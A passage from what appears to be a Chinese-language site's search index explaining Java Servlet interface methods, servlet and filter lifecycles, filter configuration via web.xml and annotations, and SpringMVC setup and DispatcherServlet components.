\u65b9\u6cd5\uff1b\u5982\u679c\u5f97\u5230\u7684\u662f\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u5c31\u4f1a\u8c03\u7528 doPost() \u65b9\u6cd5\u3002</p> <pre><code>public void doGet(HttpServletRequest request, \n HttpServletResponse response) \n throws ServletException, IOException \n{ \n// \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u5904\u7406 GET \u8bf7\u6c42\u7684\u4ee3\u7801\n// \u4ee5\u6b64\u7c7b\u63a8\uff0c\u82e5\u662f POST \u8bf7\u6c42\uff0c\u5219\u8c03\u7528 public void doPost \u65b9\u6cd5\n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#4destroy","title":"4.destroy() \u63a5\u53e3","text":"<p>\u5f53 Servlet \u5bb9\u5668\u68c0\u6d4b\u5230\u4e00\u4e2a Servlet \u5bf9\u8c61\u5e94\u8be5\u4ece\u670d\u52a1\u4e2d\u88ab\u79fb\u9664\u65f6\uff0c\u4f1a\u8c03\u7528\u8be5\u5bf9\u8c61\u7684destroy() \u65b9\u6cd5\uff0c\u4ee5\u4fbf Servlet \u5bf9\u8c61\u91ca\u653e\u5b83\u6240\u4f7f\u7528\u7684\u8d44\u6e90\uff0c\u4fdd\u5b58\u6570\u636e\u5230\u6301\u4e45\u5b58\u50a8\u8bbe\u5907\u4e2d\u3002\u4f8b\u5982\u5c06\u5185\u5b58\u4e2d\u7684\u6570\u636e\u4fdd\u5b58\u5230\u6570\u636e\u5e93\u4e2d\u3001\u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\u3001\u505c\u6b62\u540e\u53f0\u7ebf\u7a0b\u3001\u628a Cookie \u5217\u8868\u6216\u5355\u51fb\u8ba1\u6570\u5668\u5199\u5165\u78c1\u76d8\uff0c\u5e76\u6267\u884c\u5176\u4ed6\u7c7b\u4f3c\u7684\u6e05\u7406\u6d3b\u52a8\u7b49\u3002destroy() \u65b9\u6cd5\u4e0e init() \u65b9\u6cd5\u76f8\u540c\uff0c\u53ea\u4f1a\u88ab\u8c03\u7528\u4e00\u6b21\u3002</p> <pre><code>public void destroy() \n{ \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u8fdb\u884c\u7ec8\u6b62\u64cd\u4f5c\u7684\u4ee3\u7801\n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#5getservletconfig","title":"5.getServletConfig() \u63a5\u53e3","text":"<p>getServletConfig() \u65b9\u6cd5\u8fd4\u56de Servlet \u5bb9\u5668\u8c03\u7528 init() \u65b9\u6cd5\u65f6\u4f20\u9012\u7ed9 Servlet \u5bf9\u8c61\u7684ServletConfig \u5bf9\u8c61\uff0cServletConfig \u5bf9\u8c61\u5305\u542b Servlet \u7684\u521d\u59cb\u5316\u53c2\u6570\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u5728Servlet \u7684\u914d\u7f6e\u6587\u4ef6 web.xml \u4e2d\uff0c\u4f7f\u7528\u6807\u7b7e\u4e3a Servlet \u914d\u7f6e\u4e00\u4e9b\u521d\u59cb\u5316\u53c2\u6570\uff1a <pre><code>&lt;servlet&gt; \n &lt;servlet-name&gt;servlet&lt;/servlet-name&gt; \n &lt;servlet-class&gt;org.test.TestServlet&lt;/servlet-class&gt; \n &lt;init-param&gt; \n &lt;param-name&gt;userName&lt;/param-name&gt; \n &lt;param-value&gt;panda&lt;/param-value&gt; \n &lt;/init-param&gt; \n &lt;init-param&gt; \n &lt;param-name&gt;E-mail&lt;/param-name&gt; \n &lt;param-value&gt;test@test.net&lt;/param-value&gt; \n&lt;/init-param&gt; \n &lt;/servlet&gt;\n</code></pre> <p>\u7ecf\u8fc7\u4e0a\u9762\u7684\u914d\u7f6e\uff0c\u5373\u53ef\u5728 Servlet \u4e2d\u901a\u8fc7\u8c03\u7528 getServletConfig()\uff0c\u5e76\u83b7\u5f97\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u53c2\u6570\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#6getservletinfo","title":"6.getServletInfo() \u63a5\u53e3","text":"<p>getServletInfo() \u65b9\u6cd5\u4f1a\u8fd4\u56de\u4e00\u4e2a String \u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u5305\u62ec\u5173\u4e8e Servlet \u7684\u4fe1\u606f\uff0c\u5982\u4f5c\u8005\u3001\u7248\u672c\u53ca\u7248\u6743\u7b49\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#servlet_3","title":"Servlet \u7684\u751f\u547d\u5468\u671f","text":"<p>\u6211\u4eec\u5e38\u8bf4\u7684 Servlet \u751f\u547d\u5468\u671f\u6307\u7684\u662f Servlet \u4ece\u521b\u5efa\u76f4\u5230\u9500\u6bc1\u7684\u6574\u4e2a\u8fc7\u7a0b\u3002\u5728\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e2d\uff0cServlet \u7ecf\u5386\u4e86\u88ab\u52a0\u8f7d\u3001\u521d\u59cb\u5316\u3001\u63a5\u6536\u8bf7\u6c42\u3001\u54cd\u5e94\u8bf7\u6c42\u4ee5\u53ca\u63d0\u4f9b\u670d\u52a1\u7684\u8fc7\u7a0b.</p> <p></p> <p>\u5f53\u7528\u6237\u7b2c\u4e00\u6b21\u5411\u670d\u52a1\u5668\u53d1\u8d77\u8bf7\u6c42\u65f6\uff0c\u670d\u52a1\u5668\u4f1a\u89e3\u6790\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u6b64\u65f6\u5bb9\u5668\u4f1a\u52a0\u8f7d Servlet\uff0c\u7136\u540e\u521b\u5efa Servet \u5b9e\u4f8b\uff0c\u518d\u8c03\u7528 init() \u65b9\u6cd5\u521d\u59cb\u5316 Servlet\uff0c\u7d27\u63a5\u7740\u8c03\u7528\u670d\u52a1\u7684 service() \u65b9\u6cd5\u53bb\u5904\u7406\u7528\u6237 GET\u3001POST \u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7684\u8bf7\u6c42\u3002\u5f53\u6267\u884c\u5b8c Servlet \u4e2d\u5bf9\u5e94 class \u6587\u4ef6\u7684\u903b\u8f91\u540e\uff0c\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u518d\u54cd\u5e94\u7528\u6237\u8bf7\u6c42\u3002\u5f53\u670d\u52a1\u5668\u4e0d\u518d\u9700\u8981 Servlet \u5b9e\u4f8b\u6216\u91cd\u65b0\u8f7d\u5165 Servlet \u65f6\uff0c\u4f1a\u8c03\u7528 destroy() \u65b9\u6cd5\uff0c\u501f\u52a9\u8be5\u65b9\u6cd5\uff0cServlet \u53ef\u4ee5\u91ca\u653e\u6389\u6240\u6709\u5728 init()\u65b9\u6cd5\u4e2d\u7533\u8bf7\u7684\u8d44\u6e90\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-web-filter","title":"Java Web \u8fc7\u6ee4\u5668\u2014\u2014filter","text":"<p>filter \u88ab\u79f0\u4e3a\u8fc7\u6ee4\u5668\uff0c\u662f Servlet 2.3 \u65b0\u589e\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u540c\u65f6\u5b83\u4e5f\u662f Servlet \u6280\u672f\u4e2d\u6700\u5b9e\u7528\u7684\u6280\u672f\u3002\u5f00\u53d1\u4eba\u5458\u901a\u8fc7 Filter \u6280\u672f\uff0c\u80fd\u591f\u5b9e\u73b0\u5bf9\u6240\u6709 Web \u8d44\u6e90\u7684\u7ba1\u7406\uff0c\u5982\u5b9e\u73b0\u6743\u9650\u8bbf\u95ee\u63a7\u5236\u3001\u8fc7\u6ee4\u654f\u611f\u8bcd\u6c47\u3001\u538b\u7f29\u54cd\u5e94\u4fe1\u606f\u7b49\u4e00\u4e9b\u9ad8\u7ea7\u529f\u80fd\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#filter","title":"filter \u7684\u914d\u7f6e","text":"<p>filter \u7684\u914d\u7f6e\u7c7b\u4f3c\u4e8e Servlet\uff0c\u7531\u548c\u4e24\u7ec4\u6807\u7b7e\u7ec4\u6210\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u540c\u6837\uff0c\u5982\u679c Servlet \u7248\u672c\u5927\u4e8e 3.0\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\u7684\u65b9\u5f0f\u6765\u914d\u7f6e filter\u3002"},{"location":"Code_audit/Java/Java-2/Java2.html#webxml","title":"\u57fa\u4e8e web.xml \u7684\u914d\u7f6e","text":"<p>filter \u540c\u6837\u6709\u5f88\u591a\u6807\u7b7e\uff0c\u5176\u4e2d\u5404\u4e2a\u6807\u7b7e\u7684\u542b\u4e49\u5982\u4e0b\u3002</p> <ul> <li>\uff1a\u6307\u5b9a\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002 <li>\uff1a\u7528\u4e8e\u4e3a\u8fc7\u6ee4\u5668\u6307\u5b9a\u4e00\u4e2a\u540d\u79f0\uff0c\u8be5\u5143\u7d20\u7684\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\u3002 <li>\uff1a\u7528\u4e8e\u6307\u5b9a\u8fc7\u6ee4\u5668\u7684\u5b8c\u6574\u7684\u9650\u5b9a\u7c7b\u540d\u3002 <li>\uff1a\u7528\u4e8e\u4e3a\u8fc7\u6ee4\u5668\u6307\u5b9a\u521d\u59cb\u5316\u53c2\u6570\u3002 <li>\uff1a\u4e3a\u7684\u5b50\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u53c2\u6570\u7684\u540d\u79f0\u3002 <li>\uff1a\u4e3a\u7684\u5b50\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u53c2\u6570\u7684\u503c\u3002 <li>\uff1a\u7528\u4e8e\u8bbe\u7f6e\u4e00\u4e2a filter \u6240\u8d1f\u8d23\u62e6\u622a\u7684\u8d44\u6e90\u3002 <li>\uff1a\u4e3a\u5b50\u5143\u7d20\uff0c\u7528\u4e8e\u8bbe\u7f6e filter \u7684\u6ce8\u518c\u540d\u79f0\u3002\u8be5\u503c\u5fc5\u987b\u662f\u5728\u5143\u7d20\u4e2d\u58f0\u660e\u8fc7\u7684\u8fc7\u6ee4\u5668\u7684\u540d\u79f0\u3002 <li>\uff1a\u7528\u4e8e\u8bbe\u7f6e filter \u6240\u62e6\u622a\u7684\u8bf7\u6c42\u8def\u5f84\uff08\u8fc7\u6ee4\u5668\u5173\u8054\u7684 URL \u6837\u5f0f\uff09\u3002 <li>\uff1a\u7528\u4e8e\u6307\u5b9a\u8fc7\u6ee4\u5668\u6240\u62e6\u622a\u7684 Servlet \u540d\u79f0\u3002 <p></p>"},{"location":"Code_audit/Java/Java-2/Java2.html#_1","title":"\u57fa\u4e8e\u6ce8\u89e3\u65b9\u5f0f\u7684\u914d\u7f6e","text":"<p>\u56e0\u4e3a Servlet \u7684\u5173\u7cfb\uff0c\u5728 Servlet 3.0 \u4ee5\u540e\uff0c\u5f00\u53d1\u8005\u540c\u6837\u53ef\u4ee5\u4e0d\u7528\u5728 web.xml \u91cc\u9762\u914d\u7f6e filter\uff0c\u53ea\u9700\u8981\u6dfb\u52a0@WebServlet \u6ce8\u89e3\u5c31\u53ef\u4ee5\u4fee\u6539 filter \u7684\u5c5e\u6027</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u7b2c 15 \u884c\u7684@WebServlet \u7684\u6ce8\u89e3\u53c2\u6570\u6709 description \u53ca urlPatterns\uff0c\u6b64\u5916\u8fd8\u6709\u5f88\u591a\u53c2\u6570</p> <p></p> <p>\u7531\u6b64\u53ef\u89c1\uff0cweb.xml \u53ef\u4ee5\u914d\u7f6e\u7684 filter \u5c5e\u6027\u90fd\u53ef\u4ee5\u901a\u8fc7 @WebServlet \u7684\u65b9\u5f0f\u8fdb\u884c\u914d\u7f6e\u3002\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e00\u822c\u4e0d\u63a8\u8350\u4f7f\u7528\u6ce8\u89e3\u65b9\u5f0f\u6765\u914d\u7f6e filter\uff0c\u56e0\u4e3a\u5982\u679c\u5b58\u5728\u591a\u4e2a\u8fc7\u6ee4\u5668\uff0c\u4f7f\u7528 web.xml \u914d\u7f6e filter \u53ef\u4ee5\u63a7\u5236\u8fc7\u6ee4\u5668\u7684\u6267\u884c\u987a\u5e8f\uff1b\u5982\u679c\u4f7f\u7528\u6ce8\u89e3\u65b9\u5f0f\u6765\u914d\u7f6e filter\uff0c\u5219\u65e0\u6cd5\u786e\u5b9a\u8fc7\u6ee4\u5668\u7684\u6267\u884c\u987a\u5e8f\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#filter_1","title":"filter \u7684\u4f7f\u7528\u6d41\u7a0b\u53ca\u5b9e\u73b0\u65b9\u5f0f","text":"<p>filter \u63a5\u53e3\u4e2d\u6709\u4e00\u4e2a doFilter \u65b9\u6cd5\uff0c\u5f53\u5f00\u53d1\u4eba\u5458\u7f16\u5199\u597d Filter \u7684\u62e6\u622a\u903b\u8f91\uff0c\u5e76\u914d\u7f6e\u5bf9\u54ea\u4e2a Web \u8d44\u6e90\u8fdb\u884c\u62e6\u622a\u540e\uff0cWeb \u670d\u52a1\u5668\u4f1a\u5728\u6bcf\u6b21\u8c03\u7528 Web \u8d44\u6e90\u7684 service() \u65b9\u6cd5\u4e4b\u524d\u5148\u8c03\u7528 doFilter \u65b9\u6cd5\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe \u6240\u793a\u3002</p> <p>\u5f53\u7528\u6237\u5411\u670d\u52a1\u5668\u53d1\u9001 request \u8bf7\u6c42\u65f6\uff0c\u670d\u52a1\u5668\u63a5\u53d7\u8be5\u8bf7\u6c42\uff0c\u5e76\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u7b2c\u4e00\u4e2a\u8fc7\u6ee4\u5668\u4e2d\u8fdb\u884c\u5904\u7406\u3002\u5982\u679c\u6709\u591a\u4e2a\u8fc7\u6ee4\u5668\uff0c\u5219\u4f1a\u4f9d\u6b21\u7ecf\u8fc7 filter 2\uff0cfilter 3\uff0c\u2026\u2026\uff0cfilter n\u3002\u63a5\u7740\u8c03\u7528 Servlet \u4e2d \u7684 service() \u65b9\u6cd5\uff0c\u8c03\u7528\u5b8c\u6bd5\u540e\uff0c\u6309\u7167\u4e0e\u8fdb\u5165\u65f6\u76f8\u53cd\u7684\u987a\u5e8f\uff0c\u4ece\u8fc7\u6ee4\u5668 filter n \u5f00\u59cb\uff0c\u4f9d\u6b21\u7ecf\u8fc7\u5404\u4e2a\u8fc7\u6ee4\u5668\uff0c\u76f4\u5230\u8fc7\u6ee4\u5668 filter 1\u3002\u6700\u7ec8\u5c06\u5904\u7406\u540e\u7684\u7ed3\u679c\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u518d\u53cd\u9988\u7ed9\u7528\u6237\u3002</p> <p>filter \u8fdb\u884c\u62e6\u622a\u7684\u65b9\u5f0f\u4e5f\u5f88\u7b80\u5355\uff0c\u5728 HttpServletRequest \u5230\u8fbe Servlet \u4e4b\u524d\uff0cfilter \u62e6\u622a\u5ba2\u6237\u7684 HttpServletRequest \uff0c\u6839\u636e\u9700\u8981\u68c0\u67e5 HttpServletRequest \uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539HttpServletRequest \u5934\u548c\u6570\u636e\u3002\u5728 HttpServletResponse \u5230\u8fbe\u5ba2\u6237\u7aef\u4e4b\u524d\uff0c\u62e6\u622aHttpServletResponse\uff0c\u6839\u636e\u9700\u8981\u68c0\u67e5 HttpServletResponse\uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539 HttpServletResponse\u5934\u548c\u6570\u636e\u3002</p> <p></p>"},{"location":"Code_audit/Java/Java-2/Java2.html#filter_2","title":"filter \u7684\u63a5\u53e3\u65b9\u6cd5","text":""},{"location":"Code_audit/Java/Java-2/Java2.html#1init_1","title":"1.Init() \u63a5\u53e3","text":"<p>\u4e0e Servlet \u4e2d\u7684 init() \u65b9\u6cd5\u7c7b\u4f3c\uff0cfilter \u4e2d\u7684 init() \u65b9\u6cd5\u7528\u4e8e\u521d\u59cb\u5316\u8fc7\u6ee4\u5668\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u5728 init() \u65b9\u6cd5\u4e2d\u5b8c\u6210\u4e0e\u6784\u9020\u65b9\u6cd5\u7c7b\u4f3c\u7684\u521d\u59cb\u5316\u529f\u80fd\u3002\u5982\u679c\u521d\u59cb\u5316\u4ee3\u7801\u4e2d\u8981\u7528\u5230 FillerConfig \u5bf9\u8c61\uff0c\u5219\u8fd9\u4e9b\u521d\u59cb\u5316\u4ee3\u7801\u53ea\u80fd\u5728 filler \u7684 init() \u65b9\u6cd5\u4e2d\u7f16\u5199\uff0c\u800c\u4e0d\u80fd\u5728\u6784\u9020\u65b9\u6cd5\u4e2d\u7f16\u5199\u3002</p> <p>init() \u65b9\u6cd5\u7684\u5b9a\u4e49\u5982\u4e0b\u3002</p> <pre><code>public void init(FilterConfig fConfig) throws ServletException { \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u5b9a\u4e49\u7684\u521d\u59cb\u5316\u4ee3\u7801... \n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#2dofilter","title":"2.doFilter() \u63a5\u53e3","text":"<p>doFilter \u65b9\u6cd5\u7c7b\u4f3c\u4e8e Servlet \u63a5\u53e3\u7684 service() \u65b9\u6cd5\u3002\u5f53\u5ba2\u6237\u7aef\u8bf7\u6c42\u76ee\u6807\u8d44\u6e90\u65f6\uff0c\u5bb9\u5668\u4f1a\u7b5b\u9009\u51fa\u7b26\u5408 \u6807\u7b7e\u4e2d \u7684 filter\uff0c\u5e76\u6309\u7167\u58f0\u660e \u7684\u987a\u5e8f\u4f9d\u6b21\u8c03\u7528\u8fd9\u4e9b filter \u7684 doFilter() \u65b9\u6cd5\u3002\u9700\u8981\u6ce8\u610f\u7684\u662fdoFilter() \u65b9\u6cd5\u6709\u591a\u4e2a\u53c2\u6570\uff0c\u5176\u4e2d\u53c2\u6570 request \u548c response \u4e3a Web \u670d\u52a1\u5668\u6216 filter \u94fe\u4e2d\u7684\u4e0a\u4e00\u4e2a filter \u4f20\u9012\u8fc7\u6765\u7684\u8bf7\u6c42\u548c\u54cd\u5e94\u5bf9\u8c61\u3002\u53c2\u6570 chain \u4ee3\u8868\u5f53\u524d filter \u94fe\u7684\u5bf9\u8c61\uff0c\u53ea\u6709\u5728\u5f53\u524d filter \u5bf9\u8c61\u4e2d\u7684 doFilter() \u65b9\u6cd5\u5185\u90e8\u9700\u8981\u8c03\u7528 FilterChain \u5bf9\u8c61\u7684doFilter() \u65b9\u6cd5\u65f6\uff0c\u624d\u80fd\u628a\u8bf7\u6c42\u4ea4\u4ed8\u7ed9 filter \u94fe\u4e2d\u7684\u4e0b\u4e00\u4e2a filter \u6216\u8005\u76ee\u6807\u7a0b\u5e8f\u5904\u7406\u3002 <p>doFilter() \u65b9\u6cd5\u7684\u5b9a\u4e49\u5982\u4e0b\u3002</p> <pre><code>public void doFilter(ServletRequest request, ServletResponse response, \nFilterChain chain) throws IOException, ServletException { \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u5b9a\u4e49\u7684\u8fc7\u6ee4\u4ee3\u7801\n ... \n // \u4f20\u9012 filter \u94fe\n chain.doFilter(request, response); \n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#3destroy","title":"3.destroy() \u63a5\u53e3","text":"<p>filter \u4e2d\u7684 destroy() \u65b9\u6cd5\u4e0e Servlet \u4e2d\u7684 destroy() \u4f5c\u7528\u7c7b\u4f3c\uff0c\u5728 Web \u670d\u52a1\u5668\u5378 \u8f7d filter \u5bf9\u8c61\u4e4b\u524d\u88ab\u8c03\u7528\uff0c\u7528\u4e8e\u91ca\u653e\u88ab filter \u5bf9\u8c61\u6253\u5f00\u7684\u8d44\u6e90\uff0c\u5982\u5173\u95ed\u6570\u636e\u5e93\u3001\u5173\u95ed I/O \u6d41\u7b49\u3002</p> <pre><code>public void destroy() { \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u8fdb\u884c\u7ec8\u6b62\u64cd\u4f5c\u7684\u4ee3\u7801\n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#filter_3","title":"filter \u7684\u751f\u547d\u5468\u671f","text":"<p>filter \u7684\u751f\u547d\u5468\u671f\u4e0e Servlet \u7684\u751f\u547d\u5468\u671f\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6307\u7684\u662f filter \u4ece\u521b\u5efa\u5230\u9500\u6bc1\u7684\u6574\u4e2a\u8fc7\u7a0b\u3002\u5728\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e2d\uff0cfilter \u7ecf\u5386\u4e86\u88ab\u52a0\u8f7d\u3001\u521d\u59cb\u5316\u3001\u63d0\u4f9b\u670d\u52a1\u53ca\u9500\u6bc1\u7684\u8fc7\u7a0b</p> <p></p> <p>\u5f53 Web \u5bb9\u5668\u542f\u52a8\u65f6\uff0c\u4f1a\u6839\u636e web.xml \u4e2d\u58f0\u660e\u7684 filter \u987a\u5e8f\u4f9d\u6b21\u5b9e\u4f8b\u5316\u8fd9\u4e9bfilter\u3002\u7136\u540e\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7d\u65f6\u8c03\u7528 init() \u65b9\u6cd5\uff0c\u968f\u5373\u5728\u5ba2\u6237\u7aef\u6709\u8bf7\u6c42\u65f6\u8c03\u7528doFilter() \u65b9\u6cd5\uff0c\u5e76\u4e14\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u7684\u4e0d\u540c\uff0cdoFilter() \u65b9\u6cd5\u53ef\u80fd\u88ab\u8c03\u7528\u591a\u6b21\u3002\u6700\u540e\u5728Web \u5e94\u7528\u7a0b\u5e8f\u5378\u8f7d\uff08\u6216\u5173\u95ed\uff09\u65f6\u8c03\u7528 destroy()\u65b9\u6cd5\u3002</p>"},{"location":"Code_audit/Java/Java-3/Java3.html","title":"SpringMVC\u5b9e\u73b0\u6b65\u9aa4","text":"<pre><code>servlet \u7684\u5b9e\u73b0\u65b9\u5f0f\uff1a jsp\u53d1\u8d77-----servlet-----jsp\u663e\u793a\u7ed3\u679c\n\u6b65\u9aa4\uff1a1\uff09\u521b\u5efaweb\u5e94\u7528\n     2\uff09\u52a0\u5165web\u4f9d\u8d56   Spring-webmvc(springmvc\u6846\u67b6\u4f9d\u8d56) \uff0cservlet\u4f9d\u8d56\n     3\uff09\u58f0\u660espringmvc\u6838\u5fc3\u5bf9\u8c61DispatcherServlet   \n        1.DispatcherServlet\u662f\u4e00\u4e2aservlet\u5bf9\u8c61    \n        2.DispatcherServlet\u53eb\u505a\u524d\u7aef\u63a7\u5236\u5668\uff08front controller\uff09 \n        3.DispatcherServlet\u4f5c\u7528\uff1a\u5728servlet\u7684init()\u65b9\u6cd5\u4e2d\uff0c\u521b\u5efaspringmvc\u4e2d\u7684\u5bb9\u5668\u5bf9\u8c61    \u4f5c\u4e3aservlet\uff0c\u63a5\u6536\u8bf7\u6c42\n     4\uff09\u521b\u5efa\u4e00\u4e2ajsp,\u53d1\u8d77\u8bf7\u6c42\n     5\uff09\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7c7b\uff0c\u4f5c\u4e3a\u63a7\u5236\u5668\u4f7f\u7528\uff08\u4ee3\u66ff\u4e4b\u524d\u7684servlet\uff09  \n        1.\u5728\u6ce8\u89e3\u4e0a\u9762\u52a0\u5165@Controller\u6ce8\u89e3  \n        2.\u5728\u7c7b\u4e2d\u5b9a\u4e49\u65b9\u6cd5\uff0c\u65b9\u6cd5\u4e0a\u9762\u52a0\u5165@RequestMapping\u6ce8\u89e3\u65b9\u5f0f\u5904\u7406\u8bf7\u6c42\uff0c\u76f8\u5f53\u4e8eservlet\u5f97doGet\uff0cdoPost\n    6\uff09\u521b\u5efa\u4f5c\u4e3a\u7ed3\u679c\u5f97jsp\u9875\u9762\n    7\uff09\u521b\u5efaspringmvc\u5f97\u914d\u7f6e\u6587\u4ef6(spring\u7684\u914d\u7f6e\u6587\u4ef6\u4e00\u6837)  \n        1.\u58f0\u660e\u7ec4\u4ef6\u626b\u63cf\u5668\uff0c\u6307\u5b9a@Controller\u6ce8\u89e3\u6240\u5728\u7684\u5305\u540d  \n        2.\u58f0\u660e\u89c6\u56fe\u89e3\u6790\u5668\u5bf9\u8c61\n</code></pre>"},{"location":"Code_audit/Java/Java-3/Java3.html#springmvc_1","title":"\u7b2c\u4e00\u4e2a\u6ce8\u89e3\u7684SpringMVC\u7a0b\u5e8f","text":"<p>\u76ee\u5f55</p> <p></p> <p>\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684\u7c7b\uff0c\u4f5c\u4e3a\u63a7\u5236\u5668\u4f7f\u7528\uff0c\u4ee3\u66ff\u4e4b\u524d\u7684servlet</p> <p></p> <p></p> <p></p> <p>\u521b\u5efa\u663e\u793a\u5904\u7406\u7ed3\u679c\u7684jsp\u9875\u9762\uff08webapp\\WEB-INF\\view\\show.jsp\uff09</p> <p></p> <p></p> <p>\u521b\u5efaspringmvc\u7684\u914d\u7f6e\u6587\u4ef6</p> <p></p> <p>\u914d\u7f6eTomcat\u5e76\u4e14\u542f\u52a8\u6d4b\u8bd5</p> <p></p> <p></p>"},{"location":"Code_audit/Java/Java-3/Java3.html#springmvcweb","title":"SpringMVC\u6846\u67b6\u5904\u7406web\u8bf7\u6c42\u7684\u987a\u5e8f","text":"<p>SpringMVC \u6267\u884c\u6d41\u7a0b</p> <p></p>"},{"location":"Code_audit/Java/Java-3/Java3.html#springmvc_2","title":"springmvc \u6e90\u7801\u5206\u6790","text":""},{"location":"Code_audit/Java/Java-3/Java3.html#dispatcherservlet","title":"DispatcherServlet \u7ec4\u4ef6","text":"<pre><code>HandlerMapping\uff08\u5904\u7406\u5668\u6620\u5c04\u5668\uff09:HandlerMapping \u662f\u2f64\u6765\u67e5\u627e Handler \u7684\uff0c\u4e5f\u5c31\u662f\u5904\u7406\u5668\uff0c\u5177\u4f53\u7684\u8868\u73b0\u5f62\u5f0f\u53ef\u4ee5\u662f\u7c7b\uff0c\u4e5f\u53ef\u4ee5\u662f\u2f45\u6cd5\u3002\u2f50\u5982\uff0c\u6807\u6ce8\u4e86@RequestMapping\u7684\u6bcf\u4e2a\u2f45\u6cd5\u90fd\u53ef\u4ee5\u770b\u6210\u662f\u2f00\u4e2aHandler\u3002Handler\u8d1f\u8d23\u5177\u4f53\u5b9e\u9645\u7684\u8bf7\u6c42\u5904\u7406\uff0c\u5728\u8bf7\u6c42\u5230\u8fbe\u540e\uff0cHandlerMapping \u7684\u4f5c\u2f64\u4fbf\u662f\u627e\u5230\u8bf7\u6c42\u76f8\u5e94\u7684\u5904\u7406\u5668Handler \u548c Interceptor.\nHandlerAdapter\uff08\u5904\u7406\u5668\u9002\u914d\u5668\uff09:HandlerAdapter \u662f\u2f00\u4e2a\u9002\u914d\u5668\u3002\u56e0\u4e3a Spring MVC \u4e2d Handler \u53ef\u4ee5\u662f\u4efb\u610f\u5f62\u5f0f\u7684\uff0c\u53ea\u8981\u80fd\u5904\u7406\u8bf7\u6c42\u5373\u53ef\u3002\u4f46\u662f\u628a\u8bf7\u6c42\u4ea4\u7ed9 Servlet \u7684\u65f6\u5019\uff0c\u7531\u4e8e Servlet \u7684\u2f45\u6cd5\u7ed3\u6784\u90fd\u662fdoService(HttpServletRequest req,HttpServletResponse resp)\u5f62\u5f0f\u7684\uff0c\u8981\u8ba9\u56fa\u5b9a\u7684 Servlet \u5904\u7406\u2f45\u6cd5\u8c03\u2f64 Handler \u6765\u8fdb\u2f8f\u5904\u7406\uff0c\u4fbf\u662f HandlerAdapter \u7684\u804c\u8d23\u3002\nViewResolver:ViewResolver\u5373\u89c6\u56fe\u89e3\u6790\u5668\uff0c\u2f64\u4e8e\u5c06String\u7c7b\u578b\u7684\u89c6\u56fe\u540d\u548cLocale\u89e3\u6790\u4e3aView\u7c7b\u578b\u7684\u89c6\u56fe\uff0c\u53ea\u6709\u2f00\u4e2aresolveViewName()\u2f45\u6cd5\u3002\u4ece\u2f45\u6cd5\u7684\u5b9a\u4e49\u53ef\u4ee5\u770b\u51fa\uff0cController\u5c42\u8fd4\u56de\u7684String\u7c7b\u578b\u89c6\u56fe\u540dviewName \u6700\u7ec8\u4f1a\u5728\u8fd9\u2fa5\u88ab\u89e3\u6790\u6210\u4e3aView\u3002View\u662f\u2f64\u6765\u6e32\u67d3\u2eda\u2faf\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4f1a\u5c06\u7a0b\u5e8f\u8fd4\u56de\u7684\u53c2\u6570\u548c\u6570\u636e\u586b\u2f0a\u6a21\u677f\u4e2d\uff0c\u2f63\u6210html\u2f42\u4ef6\u3002ViewResolver \u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e3b\u8981\u5b8c\u6210\u4e24\u4ef6\u4e8b\u60c5\uff1aViewResolver 